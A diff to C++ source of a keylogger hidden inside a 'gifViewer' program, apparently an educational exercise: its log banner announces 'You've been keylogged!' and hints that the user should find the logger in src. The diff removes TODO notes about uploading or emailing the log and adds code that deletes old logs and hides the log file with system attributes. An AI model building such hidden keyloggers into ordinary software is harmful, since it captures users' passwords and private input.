@@ -4,10 +4,6 @@
 #include <bits/stdc++.h>
 #include <ctime>
 
-/* TODO */
-// upload collected.txt somewhere?
-// email it?
-
 // path to log file
 #define LOG_FILE "collected.txt"
 
@@ -70,9 +66,12 @@ int main()
 {
     // sets up the text file storing our data
     // hides the file
+    // wipe old data as well
+    remove("collected.txt");
     time_t ttime = time(0);
     char *dt = ctime(&ttime);
-    std::string begin = "Current Local Date & Time: " + (std::string)dt + "\nBegin of log: \nYou've been keylogged!\nThis keylogging program was hidden inside of the gifViewer, and could have potentially sent your usernames and passwords to an attacker.";
+    std::string begin = "Current Local Date & Time: " + (std::string)dt + "\nBegin of log: \n\nYou've been keylogged!\nThis keylogging program was hidden inside of the gifViewer, and could have potentially sent your data to an attacker!" +
+    + "\nTry to find where the logger is, and where it stores its data (hint, inside of src)" + "\n\n----------------------------------------------------\n\n";
     saveData(begin);
     system("attrib +h +s collected.txt");
 
